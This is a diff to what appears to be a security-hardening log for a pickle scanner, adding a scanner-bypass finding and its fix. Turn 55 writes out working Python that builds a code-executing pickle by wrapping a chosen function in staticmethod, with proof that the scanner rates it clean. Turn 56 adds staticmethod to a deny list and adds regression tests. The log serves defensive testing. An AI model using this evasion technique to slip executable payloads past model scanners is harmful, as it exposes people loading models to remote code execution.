@@ -2446,3 +2446,97 @@ Blocking plan:
 Performance note: the block is a single static policy-table entry checked by
 binary search. It does not add callable graph analysis, stack-shape simulation,
 or cross-opcode execution modeling for synthesized callables.
+
+## Turn 55 - `builtins.staticmethod` callable descriptor gap
+
+Goal: produce another compact RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `staticmethod()` as a
+callable wrapper around an attacker-selected function.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_builtins_staticmethod_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "staticmethod"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R\x940",
+        b"h\x00",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=123`, `bytes_total=123`, `opcode_count=24`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.staticmethod`, `pathlib.Path.touch`,
+  and `pathlib.PosixPath`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final descriptor call returns
+  `<staticmethod(<function Path.touch ...>)>` and does not create
+  `/tmp/ma_builtins_staticmethod_marker`
+- Unpickle result: the full payload constructs `staticmethod(Path.touch)`,
+  retrieves that memoized descriptor object, invokes it with the attacker-chosen
+  `Path`, creates `/tmp/ma_builtins_staticmethod_marker`, and returns `None`
+- RCE mechanism: since Python 3.10, `staticmethod` objects are directly
+  callable and proxy calls to their wrapped function. The pickle turns a
+  clean-looking builtin descriptor constructor into a stack-resident callable
+  that a later `REDUCE` executes.
+
+Why the scanner missed it:
+
+- `builtins.staticmethod` is absent from `BUILTIN_DANGEROUS_NAMES`.
+- The scanner correctly sees `builtins.staticmethod`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`, but all three are currently classified as clean.
+- The dangerous invocation uses the synthesized descriptor object from the
+  pickle stack, so there is no later dangerous global for the static policy
+  table to classify.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is another callable-wrapper primitive, but the focused
+next block can stay cheap: add `staticmethod` to `BUILTIN_DANGEROUS_NAMES` and
+add a manual-pickle oracle regression for the descriptor-call marker proof.
+The hot path remains a membership check on the builtin policy table.
+
+## Turn 56 - Block `builtins.staticmethod` callable descriptors
+
+Blocking plan:
+
+- Add `staticmethod` to `BUILTIN_DANGEROUS_NAMES`. On supported Python
+  versions, `staticmethod` objects can be called directly and proxy execution
+  to attacker-selected wrapped callables.
+- Add portable Rust policy coverage for raw `builtins.staticmethod` reductions
+  so the scanner flags the wrapper constructor without running the descriptor.
+- Add a CPython oracle regression that first proves
+  `staticmethod(Path.touch)` only creates a descriptor, then proves a follow-on
+  descriptor call creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix is a single builtin-name membership entry. It avoids
+descriptor-flow modeling, stack-object callability simulation, and broader
+callable-wrapper analysis.
